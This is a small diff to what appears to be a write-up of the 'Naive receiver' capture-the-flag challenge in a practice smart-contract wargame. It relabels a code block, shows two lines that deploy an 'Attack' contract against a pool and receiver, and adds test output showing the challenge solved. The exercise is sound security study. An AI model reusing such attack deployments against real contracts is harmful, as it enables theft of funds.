@@ -192,7 +192,17 @@ contract Attack {
 }
 ```
 
-```powershell
+```js
 const AttackFactory = await ethers.getContractFactory('Attack', deployer);
 attack = await AttackFactory.deploy(pool.address, receiver.address);
+```
+
+```js
+  [Challenge] Naive receiver
+    ✔ Execution (294ms)
+
+
+  1 passing (2s)
+
+Done in 2.88s.
 ```
